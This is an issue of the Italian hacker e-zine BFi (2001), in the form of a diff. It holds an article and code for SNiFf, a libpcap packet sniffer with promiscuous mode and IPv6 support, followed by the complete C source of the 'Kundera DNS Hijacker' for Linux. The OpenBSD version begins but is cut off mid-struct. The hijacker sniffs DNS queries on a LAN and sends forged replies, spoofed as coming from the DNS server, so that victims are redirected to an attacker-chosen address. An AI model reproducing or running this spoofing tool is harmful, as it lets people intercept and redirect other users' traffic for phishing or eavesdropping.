@@ -1,0 +1,1926 @@
+==============================================================================
+-----------[ BFi numero 10, anno 4 - 30/09/2001 - file 5 di 18 ]--------------
+==============================================================================
+
+
+-[ C0LUMNS ]------------------------------------------------------------------
+---[ THREADS
+-----[ VARi
+
+
+---[ SNiFf v0.3							uLiX
+---[ KUNDERA DNS HiJACKER LiNUX/OBSD v1.1      			Kundera
+---[ SiMBAC							Tharkas
+---[ Moj0 v0.1							uLiX
+---[ STR0NG							syscalo
+---[ NASC0NDERE DATi iN UN FiLE JPG				ORK
+
+
+--[ SNiFf v0.3
+---[ uLiX <uLiX@gmx.it>
+
+Ringrazio tutta la gente a me amica, che mi ha permesso di arrivare a questo 
+punto... 
+
+SNiFf e' un semplicissimo snifero con cui mi sono divertito molto (e mi 
+divertiro' ancora) a vedere cose che di solito, fidatevi, non si 
+dovrebbero vedere...
+
+Ma c'e' tcpdump, sniffit, gORk (!!)... perche' ti sei messo a fare un altro 
+sniffer di cui nessuno se ne frega una mazza?
+Evvabbe'...
+
+[Ora, dopo le possibili vostre domande inconscie, vi rispondo:
+se mai avete provato a mettere le manine su un qualsiasi source, capite subito
+come ci si sente dopo aver 'creato'... (leggo BFi, articoli di FuSyS, pIGpEN, 
+vecna e tutti quelli che mi hanno insegnato qualcosa, per fermarmi a guardare?
+Non vale la pena provare? Almeno tentateci...)]
+
+Il termine 'snifero' con cui ho chiamato questo piccolo prog non va frainteso:
+sarebbe piu' un dumper, per vedere cosa c'e' dietro le quinte, che uno sniffer
+(inteso nel suo senso piu' vero...). Per ora logga - o dovrebbe loggare -
+tutto cio' che passa da un'interfaccia (se volete potete anche specificarla da
+linea di comando) e crea una dir con diversi file .log a seconda dei pachetti
+tcp, udp, icmp...
+
+Dopo un tempo abbastanza lungo per sperimentare le socket raw e packet ho
+deciso non so perche' (sinceramente) di utilizzare la libreria *pcap*.
+Codesta lib e' stata sviluppata proprio per la cattura dei pacchetti a livello
+datalink.
+Perche' pcap? Perche' e' portabile su diversi OS (anche se ancora non ne ho
+potuti testare), e oltre a sollevarti dal compito di utilizzare raw & packet
+socket, e' abbastanza affidabile e semplice da capire.
+
+Mi verrebbe da dire che la parte piu' interessnte di SNiFf e' il supporto per
+IPv6... ma lasciatemelo testare ancora per un bel po'. Non che non funzioni, 
+chiaro, pero' - che volete - dovevo ancora capire come vanno le cose con 
+quest'altra versione...(comunque continuero' a svilupparlo...).
+
+Se il codice non vi spaventa (che poi in fondo e' una cazzata di codice...),
+qui ci sono alcuni esempi che potrebbero chiarire le idee, anche sull'IPv6 in
+genere... ;).
+
+Partendo da utlsnf.c, troviamo due funzioni che aprono il device con la
+libpcap e chiudono il prog, oltre alle varie funcs per la risoluzione degli
+ip in nomi:
+
+void pcap_device_on (int p, int v, int d, int proto, int ext, int dUMP, int h)
+{	
+	char err[400];			/*** error buffer... ***/
+	
+	if (name_face == NULL) {
+		if ((name_face = pcap_lookupdev(err)) == NULL) {
+			fprintf(stderr, "pcap_lookupdev: %s\n", err);
+		    exit(0);
+		}
+	}
+  
+  	if (p) { 
+    		if ((pcap_src = pcap_open_live (name_face, MAX_SIZE, 1, 0, err))
+								== NULL) {
+      		fprintf(stderr, "pcap_open_live: %s\n", err);
+      		exit(0);
+    	}	
+  }
+  else
+    	if ((pcap_src = pcap_open_live (name_face, MAX_SIZE, 0, 0, err))
+								== NULL) {
+      		fprintf(stderr, "pcap_open_live: %s\n", err);
+      		exit(0);
+    	}
+ 
+  	if ((datalink = pcap_datalink(pcap_src)) < 0) {
+    		fprintf(stderr, "pcap_datalink: %s\n", err);
+    		exit(0);
+  	}
+  	switch (datalink) {
+    			case DLT_EN10MB:
+      				offset = 14;
+      				break;
+    			case DLT_NULL:
+    			case DLT_PPP:	
+      				offset = 4;
+      				break;
+    			case DLT_SLIP:
+      				offset = 16;
+      				break;
+    			case DLT_RAW:
+      				offset = 0;
+      				break;
+    			case DLT_SLIP_BSDOS:
+    			case DLT_PPP_BSDOS:
+      				offset = 24;
+      				break;
+    			default:
+fprintf(stderr, "UNkNOWN DATALiNk TyPE (%d)", datalink);
+      				exit(-1);
+  	}
+	fprintf(stdout, "\n\e[0;35m%s\e[0m LiSTENiNG on \e[0;35m%s\e[0m "\
+			"INtERfACE\n\n", p_name, name_face);
+
+  	while (1) {
+    		info_buf = (u_char *)pcap_next(pcap_src, &hdr);
+    		if (info_buf != NULL)
+       		sniffo(v, d, proto, ext, dUMP, h);
+	}
+
+}
+
+void pcap_device_off ()
+{
+
+  	if (pcap_stats(pcap_src, &status) < 0)
+    	fprintf (stderr, "pcap_stats: %s\n", pcap_geterr(pcap_src));
+
+  	fprintf (stdout, "\n\n\nPACkEtS RECEiVED: \e[0;35m%d\e[0m\n", 
+		status.ps_recv);
+  	fprintf (stdout, "PACkEtS DR0PPED by kERNEl: \e[0;35m%d\e[0m\n",
+		status.ps_drop);
+
+  	fprintf (stdout, "\e[0;35m\n\nbye, BYEZ...\n\n\e[0m");
+  	exit(0);
+}
+
+a pcap_device_on passiamo:
+
+	p 	      che e' la variabile che setta la modalita' promiscua
+		      (se settata con p avremo la modalita' promiscua);
+	v	      verbose mode per sniffo() che viene chiamata alla fine;
+	d	      data, per loggare tutti i dati;
+	proto	      il protocollo da loggare (sempre da passare a sniffo()).
+
+pcap_open_live e' la chiamata che ci permette di aprire il device:
+
+	name_face     e' il nome del device;
+	MAX_SIZE      e' il numero di byte da salvare per pacchetto;
+	1	      setta la modalita' promiscua;
+	0	      e' un timeout (val = 0: ogni pacchetto e captato al
+		      momento del suo arrivo...);
+	err	      e' un puntatore ad un array...
+
+Nella pagina man di pcap(3), troviamo infatti questa definizione:
+
+	pcap_t *pcap_open_live(char *device, int snaplen,
+ 			       int promisc, int to_ms, char *ebuf)
+
+che spiega chiaramente come utilizzare la chiamata.
+
+Di seguito determiniamo il tipo di datalink:
+
+<---------------------------------------------------------------------->
+<----- Breve parentesi per una veloce spiegazione del datalink... ----->
+(tratto da Unix Network Programming...)
+
+  +---------------+      +---------------+         
+7 |  Application  |      |               |                  Application
+  +---------------+      |               |                    Details
+6 | Presentation  |      |  Application  |     User Process      +
+  +---------------+      |               |          +            |
+5 |    Session    |      |               |          |            |
+  +---------------+ <--> +-----+---+-----+ <--> +---+------------+-----+
+4 |   Transport   |      | TCP |   | UDP | 	    |            |
+  +---------------+      +-----+---+-----+          +            |
+3 |    Network    |      |  IPv4 / IPv6  |     Kernel Land       +
+  +---------------+      +---------------+                 Communication
+2 |    Datalink   |      | Device driver |                    Details
+  +---------------+      |       &       |
+1 |    Physical   |      |    Hardware   |
+  +---------------+      +---------------+
+     Modello OSI         Internet Protocol
+     			       Suite
+	       
+Troviamo diversi layer (strati) in una rete, come descritti sopra, che si
+rifanno tutti all'Open Systems Interconnection Model (OSI) per le
+comunicazioni attraverso vari computer. Al fianco vi e' una rappresentazione
+della suite di protocolli Internet, e alla fine la divisione tra i processi in
+user land e quelli in kernel land. Se con la chiamata a socket(7) siamo
+posizionati piu' o meno sulla linea che separa i processi utente da quelli
+kernel (e quindi si agisce a livello applicazioni), operando a livello
+datalink (precedente allo strato physical) si agisce ad un livello bassissimo,
+quasi come se fossimo presenti sull'hardware che permette il trasporto dei
+dati... da questo deriva un piu' esatto controllo dei pacchetti, a livello di
+dati mandati, ricevuti, checksum etc... e poi ovvio che si agisce in kernel
+land (con i suoi pregi e i suoi difetti...).
+<------------ Fine parentesi abbastanza insignificante...  ------------>
+<---------------------------------------------------------------------->
+
+Ora: a seconda del datalink avremo un preciso offset (variabile), che
+aggiungeremo poi al buffer per la lettura dei dati.
+
+Di seguito troviamo le funcs gia' citate per la risoluzione degli ip che non
+hanno nulla di strano se non l'utilizzo di getaddrinfo(3) e getnameinfo(3) al
+posto dei classici getaddrbuname ecc... (l'unica pecca e' che per poter
+passare a getnameinfo una struttura valida, sono costretto ad utilizzare
+getaddrinfo che riempie una struttura e poi copia il tutto in un'altra da
+passare... il tutto mi costa tempo operativo e nulla piu', pero'... dal lato
+positivo c'e' la totale indipendenza a livello di protocolli ip e ipv6, quindi
+si puo' valutare per bene il suo utilizzo...).
+
+Passando poi a pcksnf.c, troviamo la funzione per stabilire la versione
+dell'ip:
+
+int sniffo (int v, int d, int pROTO, int x, int dUMP, int h)
+{
+	bzero (&ip, sizeof(struct ip)); // reset della struct (?)
+	
+	ip  = (struct ip *)(info_buf + offset);
+
+	switch (VERSION) {
+			case IPV4:
+					ippg_show(v, d, pROTO, x, dUMP, h);
+					break;
+			case IPV6:
+					ipng_show(v, d, pROTO, x, dUMP, h);
+					break;
+			default:
+					fprintf(stdout, "HMMM... StRANGE iPv%d",
+						VERSION);
+					break;
+	}
+	return (0);
+}
+
+Un semplice switch e si chiamano due func: ipng_show per ipv6 e ippg_show
+(pg sta per previous generation...) per ipv4.
+
+Dopo di che tutto si risolve con switch per i diversi protocolli e cosi' via..
+
+Nella versione per ipv6 c'e' tutto un bel processino, che dovete guardarvi da
+soli purtroppo... tra le altre cose troviamo la struttura ipv6 (per la quale
+si puo' dare un occhiata a /usr/include/netinet/ip6.h per maggiori
+approfondimenti):
+
+struct ip6_hdr {
+  union {
+    struct ip6_hdrctl {
+      uint32_t ip6_un1_flow;   /* 24 bits of flow-ID */
+      uint16_t ip6_un1_plen;   /* payload length */
+      uint8_t  ip6_un1_nxt;    /* next header */
+      uint8_t  ip6_un1_hlim;   /* hop limit */
+    } ip6_un1;
+    uint8_t ip6_un2_vfc;       /* 4 bits version, 4 bits priority */
+  } ip6_ctlun;
+  struct in6_addr ip6_src;     /* source address */
+  struct in6_addr ip6_dst;     /* destination address */
+};
+
+#define ip6_vfc   ip6_ctlun.ip6_un2_vfc
+#define ip6_flow  ip6_ctlun.ip6_un1.ip6_un1_flow
+#define ip6_plen  ip6_ctlun.ip6_un1.ip6_un1_plen
+#define ip6_nxt   ip6_ctlun.ip6_un1.ip6_un1_nxt
+#define ip6_hlim  ip6_ctlun.ip6_un1.ip6_un1_hlim
+#define ip6_hops  ip6_ctlun.ip6_un1.ip6_un1_hlim
+
+Una parte di /usr/include/netinet/ip6.h e' questa qui sopra, in cui troviamo
+tutte le caratteristiche della nuova versione dell'header:
+
+<---------------------------------------------------------------------->
+<---------------------------- IPv6 HEADeR  ---------------------------->
+
+  0     3 4     7 8           15 16           23 24           31 
+  +------+-------+--------------+---------------+--------------+     \
+  |  ver | prio  |                 flow			       |     |
+  |   6  | rity  |                  label		       |     |
+  +------+-------+--------------+---------------+--------------+     |
+  |          payload            |     next      |     hop      |     |
+  |          lenght             |    header     |    limit     |     |
+  +-----------------------------+---------------+--------------+     |
+  |                                                            |     |
+  \                                                            /     | 4
+  \             128-bit destination IPv6 address               /     | 0
+  \                                                            /     |
+  |                                                            |     |
+  +------------------------------------------------------------+     |
+  |                                                            |     |
+  \                                                            /     | 
+  \             128-bit destination IPv6 address               /     |
+  \                                                            /     |
+  |                                                            |     |
+  +------------------------------------------------------------+     \
+
+* I primi 4 bit del primo byte dell'header (0-3) indicano la versione 
+dell'ip (nel nostro caso 6...) e permettono il differenziamento tra le
+due versioni.
+
+* I secondi 4 bit del primo byte dell'header (4-7) indicano la priorita'
+che non oso spiegare, ma che e' ancora in fase di sviluppo.
+
+* I 24 bit del campo 'flow label' (8-31) possono essere scelti casualmente
+dall'applicazione che ne fa uso (ancora in fase sperimentale...).
+
+* I 16 bit del campo 'payload lenght' (0-15) indicano la grandezza di tutto
+cio' che segue i 40 bytes dell'header ip.
+
+* Gli 8 bit del campo 'next header' (16-23) indicano il successivo header
+a quello ip: questo campo e' potenzialmente simile al campo 'protocol'
+dell'ipv4, ed usa gli stessi valori per definire i diversi protocolli:
+6 tcp, 17 udp... (all'icmpv6 e' stato assegnato il nuovo valore di 58).
+
+* Gli 8 bit del campo 'hop limit' (24-31) indicano per quanti router puo'
+passare il pacchetto...: questo campo e' potenzialmente simile al campo 
+'ttl' dell'ipv4, il valore di 'hop' e' diminuito di uno per ogni router
+in cui passa, ed e' ignorato dal router che diminuisce il suo valore a 0.
+
+* I due campi da 128 bit l'uno indicano l'ip source & destination address.
+
+<-------------------------- FiNE IPv6 HEADeR -------------------------->
+<---------------------------------------------------------------------->
+
+Da tenere conto l'uso di inet_ntop(3) e inet_pton(3) che sono anch'esse 
+protocollo indipendenti:
+
+inet_ntop(3) letteralmente ha questo significato: 'network to presentation', 
+ovvero cio' che poteva fare con ipv4 un inet_ntoa... rende, alla fine, 
+'presentabili' all'occhio umano gli indirizzi ip (la func inversa e' 
+inet_pton(3)):
+
+    const char *inet_ntop(int af, const void *src,
+    	                         char *dst, size_t cnt);
+
+    int inet_pton(int af, const char *src, void *dst);
+    
+queste sono le due func spiegate nelle pagina di man, in cui:
+	
+    int af 		e' la famiglia degli indirizzi(AF_INET6...);
+    const void *src	e' il puntatore al source address;
+    char *dst		e' dove verra' copiato il source address;
+    size_t cnt		e' la grandezza della struttura in cui e' 
+    			copiata *src (in6_addr) prima di passare a dst.
+
+con queste func e' possibile operare con gli indirizzi ipv6 (ma anche con 
+quelli ipv4).
+
+Per il resto, le funzioni che pcksnf.c chiama sono solo per scrivere su file
+cio' che il prog capta. Quindi avremo per ogni protocollo e versione dell'ip
+una func diversa.
+
+Una piccola nota sulla stampa dei file su .log o stdout:
+per ogni protocollo vi e' una funzione che chiama, a seconda del tipo di
+opzioni settate, diverse semplicissime routine per elaborare e stampare i
+dati.
+Il file in questione e' printsnf.c: oltre a stampare con la sola opzione -d i
+dati in formato ascii semplice, con l'opzione -x si chiamera' una diversa
+funzione che stampera' i dati in tipico formato tcpdump:
+- a destra otto gruppi di 4 cifre l'una, in formato esadecimale;
+- a sinistra 16 bit ascii per ogni linea...
+
+(ecco la func, spudoratamente scopiazzata alla peggio...):
+
+void print_ascii_hex(char *data, u_int l, FILE *log)
+{
+	u_int offset;
+	u_int i;
+	int s1, s2;
+        int nshorts;
+        char hex[BYTES*DIGITS+1], *hsp;
+        char ascii[BYTES+1], *asp;
+        offset = 0;
+
+        nshorts = l / sizeof(u_short);
+        i = 0;
+        hsp = hex; asp = ascii;
+		while (--nshorts >= 0) {		
+			s1 = *data++;
+            s2 = *data++;
+            (void)snprintf(hsp, sizeof(hex) - (hsp - hex),
+	     					         " %02x%02x", s1, s2);
+			hsp += DIGITS;
+            *(asp++) = (isgraph(s1) ? s1 : '.');
+	        *(asp++) = (isgraph(s2) ? s2 : '.');
+			if (++i >= SHORTS) {
+				*hsp = *asp = '\0';
+	        	fprintf(log, "\n0x%04x   %-*s    %s",
+  	            	        offset, LINE, hex, ascii);
+	        	i = 0; hsp = hex; asp = ascii;	
+				offset += BYTES;
+	     	}
+	    }
+        if (l & 1) {
+ 	       s1 = *data++;
+	       (void)snprintf(hsp, sizeof(hex) - (hsp - hex),
+	       				" %02x", s1);
+	       hsp += 3;
+	       *(asp++) = (isgraph(s1) ? s1 : '.');
+	       ++i;
+        }
+	if (i > 0) {
+		*hsp = *asp = '\0';
+		fprintf(log, "\n0x%04x   %-*s    %s",
+				offset, LINE, hex, ascii);
+	}
+}
+
+La solita routine per i bit, da prendere categoricamente singoli, ed e'
+fatta... se volete cambiare qualcosa, le definizioni sono in hdhsnf.h 
+(anche per le cifre e i gruppi di cifre che devono comparire sul file al 
+momento della creazione dei .log ...).
+La func originale (tcpdump) prevedeva anche un'altra variabile passabile alla
+funzione: l'offset. Se notate, l'offset e' inizializzato a zero e va avanti
+cosi' per tutto il contenuto del pacchetto (viene logically incrementato...),
+mentre in quella vera, solo in alcuni casi, e' passato anche l'offset (del
+tipo 0x200, 0x3a0, etc...)... morale: se vi aggrada, cambiatelo; se sapete
+dirmi perche' in tcpdump alcune volte si usa l'offset, ditemelo... (thnx).
+
+Per le altre funcs di stampa dati, sono sempliciotte e non ci dovrebbero
+essere grandi problemi...
+
+Per una questione di ordine ho diviso i file .c in varie parti, evitando
+di combinare un casino nel momento in cui andro' a modificare qualcosa.
+
+Opzioni:
+
+	  -h		 help classico e poco soddisfacente
+	  -v		 verbose mode (un po' piu' completo)
+	  -d		 logga qualsiasi dato in formato ascii puro
+	  -x		 logga qualsiasi dato in ascii/esadecimale
+	  -l		 salva nella directory log/ i vari file .log
+	  -p		 setta la modalita' promiscua
+	  -N		 risolve gli ip		
+	  -i		 setta l'interfaccia su cui attendere i pacchetti
+	  -c		 logga solo icmp
+	  -g		 logga solo igmp
+	  -t		 logga solo tcp
+	  -u 		 logga solo udp
+
+Ora, queste opzioni non sono un granche', pero' rendono almeno SNiFf 
+minimamente configurabile.
+
+A seconda delle ops, loggherete su file o no. Per il resto, l'output dovrebbe
+assomigliare molto da vicino a questo...
+
+Per compilare il prog, anche se ce ne dovrebbe essere gia' uno compilato,
+tipate 'make' e sara' tutto finito...
+All'interno della dir libpcap c'e' la libreria omonima gia' compilata
+anch'essa: se ci dovessero essere problemi, tipate 'make clean' e dopo
+ricompilate tutto dall'inizio (make; make install)... per il resto dovrebbe
+essere ok...
+
+Che dirvi? Provatelo...
+
+Se avete da ridire, vi incazzate, qualcosa vi fa schifo, non vi funziona
+nulla:
+scrivetemi e risolvero' i vostri problemi (sempre nei limiti del possibile)...
+
+Comunque continuero' a sviluppare codesto tool, e per gioco e per passione,
+e chissa', forse, anche per utilita'... quindi qualsiasi consiglio, aiuto,
+suggerimento etc... sono graditissimi (scrivetemi alla mail che trovate da 
+qualche parte)...
+
+THNX:
+
+Ringrazio per prima cosa tutti i ragazzi di BFi, che se non ci fossero stati
+loro, non avrei mai capito nulla (e parlo della mia vita, mica del codice...).
+Poi FuSyS, personalmente, che mi ha dato grandi notizie e spunti (e che prima
+o poi vorrei incontrare).
+Grazie a LORDBUFFY, il mio maestro di stronzate e di linuzzo, e a tutti quelli
+che come al solito dimentico (perche' ho la testa distrutta dalla malattia
+della vita: l'AMoRE...). 
+
+A ELenA (che mai lo leggera', ma AMO per davvero...)
+
+bye-byez, ragazzi.
+		 				uLiX [ uLiX@gmx.it ]
+
+[ NDR: i file del progetto sono in attachment/SNiFf-0.3.tar.gz ] 
+
+
+--[ KUNDERA DNS HiJACKER v1.1
+---[ Kundera <kundera@tiscalinet.it>
+
+<-| threads/kdh_linux11.c |->
+/* Kundera DNS Hijacker Linux version 1.1
+    This program sniff dns query in a lan from a single or all source IP adrs.
+    Afeter the sniff forge and send the reply with the spoofed address of dns
+    server and redirect the client to a custom IP address with custom
+    time to live in the reply. 
+
+    Compile in this mode : gcc kdh_obsd.c -lpcap -O2 -o ./kdh 
+    Libpcap required, download at http://www.tcpdump.org
+    Tested on Slackware 7.0 Linux 2.2.13 - i386
+
+    Author : kundera@tiscalinet.it
+    Sysop of Digital Skull BBS +39-2-93163367 24h/24h ANSI 
+    http://web.tiscalinet.it/dskull
+
+    Thanks to pigpen@s0ftpj.org for the "sniffer engine" :)	*/
+
+#include 		<stdio.h>
+#include 		<string.h>
+#include 		<unistd.h>
+#include 		<stdlib.h>
+#include 		<sys/signal.h>
+#include 		<sys/socket.h>
+#include 		<netinet/in.h>
+#include 		<pcap.h>		
+#include		<netinet/ip.h>
+#include		<netinet/udp.h>
+#include		<arpa/inet.h>
+#define TTLDEFAULT	80000
+	
+pcap_t 		      *pcap_global_descriptor;
+char           		*deviceglobal=NULL;
+int            		offset,dnsquery,sok,monitor=0;
+struct in_addr sourceip_addr;
+struct in_addr destip_addr;
+struct sockaddr_in dest;
+unsigned short		udpsourceport;
+char            dnspayl[1024];
+char			     *dnspayload;
+char			     *data2,c,*ipquery;
+unsigned char		dnsstring[255];
+u_long	ttlquery=TTLDEFAULT,ipclient=0;
+struct dnshdr {
+unsigned short int id;
+unsigned char  rd:1;           
+unsigned char  tc:1;           
+unsigned char  aa:1;           
+unsigned char  opcode:4;       
+unsigned char  qr:1;           
+
+unsigned char  rcode:4;        
+unsigned char  unused:3;       
+unsigned char  ra:1;          
+
+unsigned short int que_num;
+unsigned short int rep_num;
+unsigned short int num_rr;
+unsigned short int num_rrsup;
+} *dnsrecv,*dnssend;
+struct pseudoudp {
+u_long ipsource;
+u_long ipdest;
+char zero;
+char proto;
+u_short length;
+} *psudp;
+
+/* ---------------------------------------------------------------------- */
+
+in_cksum (unsigned short *ptr, int nbytes)
+{
+
+  register long sum;		/* assumes long == 32 bits */
+  u_short oddbyte;
+  register u_short answer;	/* assumes u_short == 16 bits */
+
+  /*
+   * Our algorithm is simple, using a 32-bit accumulator (sum),
+   * we add sequential 16-bit words to it, and at the end, fold back
+   * all the carry bits from the top 16 bits into the lower 16 bits.
+   */
+
+  sum = 0;
+  while (nbytes > 1)
+    {
+      sum += *ptr++;
+      nbytes -= 2;
+    }
+
+  /* mop up an odd byte, if necessary */
+  if (nbytes == 1)
+    {
+      oddbyte = 0;		/* make sure top half is zero */
+      *((u_char *) & oddbyte) = *(u_char *) ptr;	/* one byte only */
+      sum += oddbyte;
+    }
+
+  /*
+   * Add back carry outs from top 16 bits to low 16 bits.
+   */
+
+  sum = (sum >> 16) + (sum & 0xffff);	/* add high-16 to low-16 */
+  sum += (sum >> 16);		/* add carry */
+  answer = ~sum;		/* ones-complement, then truncate to 16 bits */
+  return (answer);
+}
+
+void pcap_device_on(void)
+{
+ char            errbuf[400];
+ int datalink;
+
+ if (!deviceglobal || !strcmp(deviceglobal, "default")) {
+  deviceglobal=pcap_lookupdev(errbuf);
+  printf("Sniffing whith device :");
+  printf(" %s.\n\n", deviceglobal);
+  
+ }
+
+ if (!deviceglobal) {
+  printf("Error getting sniffing device - %s\n", errbuf);
+  exit(1);
+ }
+
+ pcap_global_descriptor =
+  pcap_open_live(deviceglobal, 68,1, 1000, errbuf);
+
+ if (!pcap_global_descriptor) {
+  printf("error opening pcap: %s\n", errbuf);
+  exit(1);
+ }
+
+ datalink = pcap_datalink(pcap_global_descriptor);
+
+ switch (datalink) {
+  case DLT_EN10MB:		
+                  offset = 14;
+                  break;
+  case DLT_NULL:
+  case DLT_PPP:	
+                  offset = 4;
+                  break;
+  case DLT_SLIP:
+                  offset = 16;
+                  break;
+  case DLT_RAW:
+		  offset = 0;
+		  break;
+  case DLT_SLIP_BSDOS:
+  case DLT_PPP_BSDOS:
+		  offset = 24;
+		  break;
+  default:
+                  printf("unknown datalink type (%d)", datalink);
+                  exit(-1); 
+ }
+}
+
+void ethclose()
+{
+ if(pcap_global_descriptor) pcap_close(pcap_global_descriptor);
+ printf("...DnsHijacking terminated.--\n");
+ printf("...remember to call Digital Skull BBS +39-2-93163367 24h/24h !!--\n\n");
+ exit(0);
+}
+
+void usage (void)
+{
+printf("Kundera DNS Hijacker v1.1\n");
+printf("Usage: kdh [-m monitor mode] -h ip_addr in the reply [-s ip_addr of client] [-t ttl of reply]\n");
+}
+
+void sniff_and_spoofreply(void)
+{
+struct ip          *IP;  
+struct udphdr      *UDP;   
+int ipsize,udpsize; 
+struct pcap_pkthdr lpcap_hdr;
+char 	*sniff_buff;
+char *packet; 
+char *packetck;
+unsigned char *data;
+
+ if((sniff_buff=(char *) pcap_next(pcap_global_descriptor, &lpcap_hdr))){
+  (char *) sniff_buff+=offset; 
+
+IP = (struct ip *) sniff_buff; 
+  
+if (IP->ip_p == IPPROTO_UDP){
+
+ipsize=sizeof(*IP);
+
+UDP = (struct udphdr *) ((char *)sniff_buff + ((int)IP->ip_hl << 2));
+    
+udpsize=sizeof(*UDP);
+
+if (((IP->ip_src.s_addr == ipclient)&& 
+   (ntohs(UDP->dest)==53))||((ipclient==0)&& (ntohs(UDP->dest)==53)))  {
+
+sourceip_addr = IP->ip_src; 
+destip_addr = IP->ip_dst;  
+udpsourceport = ntohs(UDP->source); 
+
+bzero(dnspayl,sizeof(dnspayl));
+printf("DNS query sniffed...from %s:%d\n",
+ inet_ntoa(sourceip_addr),udpsourceport);
+
+if (monitor == 0){
+
+ dnsrecv = (struct dnshdr *)(sniff_buff+ipsize+udpsize); 
+ dnspayload = (char *)(sniff_buff+ipsize+udpsize+sizeof(*dnsrecv)); 
+ 
+strcpy(dnsstring,dnspayload);/*copia il payload dns in dnstring*/
+ 
+memcpy(dnssend,dnsrecv,sizeof(*dnsrecv)+strlen(dnsstring)+5);
+       
+       dnssend->id=dnsrecv->id;         
+       dnssend->aa=1;  		        
+       dnssend->ra=1;                   
+       dnssend->qr=1;                   
+       dnssend->rep_num = htons(1);     
+
+dnsquery=strlen(dnsstring)+5;
+      strncpy(data2+dnsquery,dnsstring,sizeof(dnsstring)+5);
+      dnsquery=dnsquery+strlen(dnsstring)+1;
+ 
+      *((u_short  *)(data2+dnsquery))  = htons(1);
+      *((u_short  *)(data2+dnsquery+2))= htons(1);
+      *((u_long *)(data2+dnsquery+4))  = htonl(ttlquery);  
+      *((u_short  *)(data2+dnsquery+8))= htons(4);
+      *((u_long *)(data2+dnsquery+10)) = inet_addr(ipquery);
+
+      dnsquery=dnsquery+14; 
+
+if ( (sok=socket(AF_INET,SOCK_RAW,IPPROTO_RAW)) < 0)
+{
+	printf("Errore nella creazione del socket.\n");
+        exit(EXIT_FAILURE);
+}
+
+packet = ( char * )malloc( ipsize + udpsize + dnsquery + 12 );
+
+IP     = (struct ip     *)packet; 
+
+memset(packet,0,sizeof(packet)); 
+        
+        IP->ip_src.s_addr  = destip_addr.s_addr;
+        IP->ip_dst.s_addr  = sourceip_addr.s_addr;
+        IP->ip_v = 4;
+        IP->ip_hl = 5;
+        IP->ip_ttl = 245;
+        IP->ip_id = htons(666);
+        IP->ip_p = 17;
+        IP->ip_len  = htons(ipsize + udpsize + dnsquery+12);
+        IP->ip_sum    = in_cksum((u_short *)packet,ipsize);
+
+ 
+UDP   = (struct udphdr    *)(packet+ipsize);
+      UDP->source = htons(53); 
+	UDP->dest   = htons(udpsourceport);
+	UDP->len     = htons(udpsize+dnsquery+12);
+	UDP->check = 0;
+      packetck = (char *)malloc(udpsize + dnsquery + 12 + sizeof(struct pseudoudp));
+	bzero(packetck,udpsize + dnsquery + 12 + sizeof(struct pseudoudp));     
+      psudp = (struct pseudoudp *) (packetck);
+      psudp->ipsource = destip_addr.s_addr;
+      psudp->ipdest = sourceip_addr.s_addr;
+	psudp->zero = 0;
+      psudp->proto = 17;
+      psudp->length = htons(udpsize+dnsquery+12);
+      memcpy(packetck+sizeof(struct pseudoudp),UDP,udpsize+dnsquery+12);
+      memcpy(packetck+sizeof(struct pseudoudp)+udpsize,dnspayl,dnsquery+12);
+
+      UDP->check   = in_cksum((u_short *)packetck,udpsize+dnsquery+12+
+                     sizeof(struct pseudoudp));    
+
+      data   = (unsigned char    *)(packet+ipsize+udpsize); 
+      memcpy(data,dnspayl,dnsquery+12);  
+                                                                                                     
+dest.sin_family=AF_INET;
+dest.sin_addr.s_addr=destip_addr.s_addr;                                                                        
+
+if (( sendto(sok,packet,ipsize+udpsize+dnsquery+12,0,( struct sockaddr * ) &dest,sizeof(dest)))<0)
+{
+printf("Error sending packet.\n");
+exit(EXIT_FAILURE);
+}
+close(sok);
+printf("Spoofed reply sent.\n");
+   }
+  }
+ }
+ }
+}
+
+int main(int argc,char **argv){
+
+if (argc < 2){
+usage();
+exit(1);
+}
+
+while((c=getopt(argc,argv,"h:t:s:m"))!=EOF){
+	switch(c) {
+	 case 'h': ipquery=optarg; break;
+	 case 't': ttlquery=atol(optarg); break;
+       case 's': ipclient=inet_addr(optarg); break;
+       case 'm': monitor = 1;
+	 }
+}
+
+signal(SIGINT,  ethclose);   
+signal(SIGTERM, ethclose);
+signal(SIGKILL, ethclose);
+signal(SIGQUIT, ethclose);
+dnssend = (struct dnshdr  *)dnspayl;
+data2   = (char *)(dnspayl+12);
+
+if (monitor == 1){
+printf("Monitoring mode ...\n");
+}else{
+printf("Sniff & reply mode ...\n");
+}
+
+pcap_device_on(); 
+
+while(1){
+
+sniff_and_spoofreply();
+
+}
+}
+<-X->
+
+<-| threads/kdh_obsd11.c |->
+/* Kundera DNS Hijacker OpenBSD version 1.1
+   This program sniff dns query in a lan from a single or all source IP adrs.
+   After the sniff forge and send the reply with the spoofed address of dns
+   server and redirect the client to a custom IP address with custom time
+   to live in the reply. 
+
+   Compile in this mode : gcc kdh_obsd.c -lpcap -O2 -o ./kdh 
+   Libpcap required, download at http://www.tcpdump.org
+   Tested on OpenBSD 2.6 & 2.8 on i386
+
+   Author : kundera@tiscalinet.it
+   Sysop of Digital Skull BBS +39-2-93163367 24h/24h ANSI 
+   http://web.tiscalinet.it/dskull
+
+   Thanks to pigpen@s0ftpj.org for the "sniffer engine" :)	*/
+
+#include 		<stdio.h>
+#include 		<string.h>
+#include 		<unistd.h>
+#include 		<stdlib.h>
+#include 		<sys/signal.h>
+#include 		<sys/socket.h>
+#include		<netinet/in_systm.h>
+#include 		<netinet/in.h>
+#include 		<pcap.h>		
+#include		<netinet/ip.h>
+#include		<netinet/udp.h>
+#include		<arpa/inet.h>
+#define TTLDEFAULT	80000
+	
+pcap_t 		      *pcap_global_descriptor;
+char           		*deviceglobal=NULL;
+int            		offset,dnsquery,sok,opt,monitor=0;
+struct in_addr sourceip_addr;
+struct in_addr destip_addr;
+struct sockaddr_in dest;
+unsigned short		udpsourceport;
+char            dnspayl[1024];
+char			     *dnspayload;
+char			     *data2,c,*ipquery;
+unsigned char		dnsstring[255];
+u_long	ttlquery=TTLDEFAULT,ipclient=0;
+
+struct dnshdr {
+unsigned short int id;
+unsigned char  rd:1;           
+unsigned char  tc:1;          
+unsigned char  aa:1;           
+unsigned char  opcode:4;       
+unsigned char  qr:1;           
+unsigned char  rcode:4;        
+unsigned char  unused:3;       
+unsigned char  ra:1;           
+unsigned short int que_num;
+unsigned short int rep_num;
+unsigned short int num_rr;
+unsigned short int num_rrsup;
+} *dnsrecv,*dnssend;
+
+struct pseudoudp {
+u_long ipsource;
+u_long ipdest;
+char zero;
+char proto;
+u_short length;
